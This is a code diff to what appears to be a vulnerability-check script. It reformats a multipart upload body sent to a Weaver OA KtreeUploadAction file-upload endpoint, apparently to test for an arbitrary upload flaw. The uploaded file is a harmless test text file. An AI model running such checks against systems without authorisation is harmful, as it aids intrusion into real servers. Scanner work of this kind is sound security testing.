@@ -18,12 +18,13 @@ def verify(url):
         'Cookie': 'Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test',
         'Upgrade-Insecure-Requests': '1'
     }
-    data = '''----------1638451160
-    Content-Disposition: form-data; name="test"; filename="test.txt"
-    Content-Type: application/octet-stream
+    data = '''
+----------1638451160
+Content-Disposition: form-data; name="test"; filename="test.txt"
+Content-Type: application/octet-stream
 
-    test
-    ----------1638451160--'''
+test
+----------1638451160--'''
     vurl = urllib.parse.urljoin(url, "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image")
     try:
         response = requests.post(vurl, headers=headers, data=data)
